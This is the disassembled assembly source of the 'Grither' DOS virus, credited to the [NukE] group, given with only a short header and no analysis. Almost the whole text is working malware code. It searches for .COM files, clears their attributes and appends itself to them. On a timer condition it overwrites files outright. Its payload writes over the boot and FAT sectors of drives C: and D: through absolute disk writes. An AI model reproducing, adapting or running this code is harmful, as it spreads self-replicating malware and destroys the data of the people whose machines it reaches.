
;**************************************************************************
;**                          GRITHER VIRUS                               **
;**      Created: 27 Oct 1990                                            **
;** [NukE] Notes: Does come from the Vienna Virus! And copies itself on  **
;**               *.COMs and will re-write the begining sectors of drive **
;**               C: & D:! Erasing the FATs area...                      **
;**                                                                      **
;** Sources Brought to you by -> Rock Steady [NukE]s Head Programmer!    **
;**								         **
;**************************************************************************

data_1e		equ	2Ch			; (65AC:002C=0)
data_2e		equ	75h			; (65AC:0075=0)
data_3e		equ	79h			; (65AC:0079=0)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

grither		proc	far

start:
;*		jmp	short loc_1		;*(0112)
		db	0EBh, 10h
		db	90h
data_5		db	'Qº', 9, 3, 'ü‹òÆ'	; Data table (indexed access)
		db	0Ah, 0
		db	0BFh, 0, 1, 0B9h, 3, 0
		db	0F3h, 0A4h, 8Bh, 0F2h, 0B4h, 30h
		db	0CDh, 21h, 3Ch, 0, 75h, 3
		db	0E9h, 0C5h, 1
loc_2:
		push	es
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	[si+0],bx
		nop				;*Fixup for MASM (M)
		mov	[si+2],es
		nop				;*Fixup for MASM (M)
		pop	es
		mov	dx,5Fh
		nop
		add	dx,si
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		push	es
		push	si
		mov	es,ds:data_1e		; (65AC:002C=0)
		mov	di,0
loc_3:
		pop	si
		push	si
		add	si,1Ah
		nop				;*Fixup for MASM (M)
		lodsb				; String [si] to al
		mov	cx,8000h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,4
  
locloop_4:
		lodsb				; String [si] to al
		scasb				; Scan es:[di] for al
		jnz	loc_3			; Jump if not zero
		loop	locloop_4		; Loop if cx > 0
  
		pop	si
		pop	es
		mov	[si+16h],di
		nop				;*Fixup for MASM (M)
		mov	di,si
		nop
		add	di,1Fh
		nop				;*Fixup for MASM (M)
		mov	bx,si
		add	si,1Fh
		nop				;*Fixup for MASM (M)
		mov	di,si
		jmp	short loc_10		; (01B9)
loc_5:
		cmp	word ptr [si+16h],0
		nop				;*Fixup for MASM (M)
		jne	loc_6			; Jump if not equal
		jmp	loc_19			; (02E9)
loc_6:
		push	ds
		push	si
		mov	ds,es:data_1e		; (65AC:002C=0)
		mov	di,si
		mov	si,es:[di+16h]
		nop				;*Fixup for MASM (M)
		add	di,1Fh
		nop				;*Fixup for MASM (M)
loc_7:
		lodsb				; String [si] to al
		cmp	al,3Bh			; ';'
		je	loc_9			; Jump if equal
		cmp	al,0
		je	loc_8			; Jump if equal
		stosb				; Store al to es:[di]
		jmp	short loc_7		; (019B)
loc_8:
		mov	si,0
loc_9:
		pop	bx
		pop	ds
		mov	[bx+16h],si
		nop				;*Fixup for MASM (M)
		nop
		cmp	ch,5Ch			; '\'
		je	loc_10			; Jump if equal
		mov	al,5Ch			; '\'
		stosb				; Store al to es:[di]
loc_10:
		mov	[bx+18h],di
		nop				;*Fixup for MASM (M)
		mov	si,bx
		add	si,10h
		nop				;*Fixup for MASM (M)
		mov	cx,6
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	si,bx
		mov	ah,4Eh			; 'N'
		mov	dx,1Fh
		nop
		add	dx,si
		mov	cx,3
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jmp	short loc_12		; (01DD)
loc_11:
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
loc_12:
		jnc	loc_13			; Jump if carry=0
		jmp	short loc_5		; (017F)
loc_13:
		mov	ax,ds:data_2e[si]	; (65AC:0075=0)
		and	al,1Fh
		cmp	al,1Fh
		je	loc_11			; Jump if equal
		cmp	word ptr ds:data_3e[si],0FA00h	; (65AC:0079=0)
		ja	loc_11			; Jump if above
		cmp	word ptr ds:data_3e[si],0Ah	; (65AC:0079=0)
		jb	loc_11			; Jump if below
		mov	di,[si+18h]
		nop				;*Fixup for MASM (M)
		push	si
		add	si,7Dh
		nop				;*Fixup for MASM (M)
loc_14:
		lodsb				; String [si] to al
		stosb				; Store al to es:[di]
		cmp	al,0
		jne	loc_14			; Jump if not equal
		pop	si
		mov	ax,4300h
		mov	dx,1Fh
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	[si+8],cx
		nop				;*Fixup for MASM (M)
		mov	ax,4301h
		and	cx,0FFFEh
		mov	dx,1Fh
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ax,3D02h
		mov	dx,1Fh
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_15			; Jump if carry=0
		jmp	loc_18			; (02DA)
loc_15:
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	[si+4],cx
		nop				;*Fixup for MASM (M)
		mov	[si+6],dx
		nop				;*Fixup for MASM (M)
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dh=sec
		and	dh,7
		jnz	loc_16			; Jump if not zero
		mov	ah,40h			; '@'
		mov	cx,85h
		mov	dx,si
		add	dx,8Ah
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jmp	short loc_17		; (02C3)
		db	90h
loc_16:
		mov	ah,3Fh			; '?'
		mov	cx,3
		mov	dx,0Ah
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		jc	loc_17			; Jump if carry Set
		cmp	ax,3
		jne	loc_17			; Jump if not equal
		mov	ax,4202h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_17			; Jump if carry Set
		mov	cx,ax
		sub	ax,3
		mov	[si+0Eh],ax
		nop				;*Fixup for MASM (M)
		add	cx,2F7h
		mov	di,si
		sub	di,1F5h
		mov	[di],cx
		mov	ah,40h			; '@'
		mov	cx,306h
		mov	dx,si
		sub	dx,1F7h
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jc	loc_17			; Jump if carry Set
		cmp	ax,306h
		jne	loc_17			; Jump if not equal
		mov	ax,4200h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_17			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	cx,3
		mov	dx,si
		add	dx,0Dh
		nop				;*Fixup for MASM (M)
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_17:
		mov	dx,[si+6]
		nop				;*Fixup for MASM (M)
		mov	cx,[si+4]
		nop				;*Fixup for MASM (M)
		and	cx,0FFE0h
		or	cx,1Fh
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_18:
		mov	ax,4301h
		mov	cx,[si+8]
		nop				;*Fixup for MASM (M)
		mov	dx,1Fh
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_19:
		push	ds
		mov	ah,1Ah
		mov	dx,[si+0]
		nop				;*Fixup for MASM (M)
		mov	ds,[si+2]
		nop				;*Fixup for MASM (M)
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		pop	ds
loc_20:
		pop	cx
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		mov	di,100h
		push	di
		xor	di,di			; Zero register
		retn	0FFFFh
		db	10 dup (0)
		db	0CDh, 20h, 90h, 0E9h, 0, 0
		db	2Ah, 2Eh, 43h, 4Fh, 4Dh, 0
		db	0, 0, 0, 0, 50h, 41h
		db	54h, 48h, 3Dh, 0, 0
		db	105 dup (0)
		db	0EBh, 58h, 90h
		db	' `7O `88@99@6r `65@85M%AACC%YMJ%'
		db	'LWNYMJW%AACC% `:@86@95r `68@87MH'
		db	'tzwyjx~%tk%Jqj}nts `5r$'
		db	'3'
		db	0C0h, 8Eh, 0D8h, 0B0h, 2, 0B9h
		db	0A0h, 0, 33h, 0D2h, 0BBh, 0
		db	0, 0CDh, 26h, 0BBh, 0, 0
loc_21:
		cmp	byte ptr data_5[bx],24h	; (65AC:0103=90h) '$'
		je	loc_22			; Jump if equal
		sub	byte ptr data_5[bx],5	; (65AC:0103=90h)
		inc	bx
		jmp	short loc_21		; (0400)
loc_22:
		mov	dx,offset data_5	; (65AC:0103=90h)
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		int	20h			; Program Terminate
  
grither		endp
  
seg_a		ends
  
  
  
		end	start
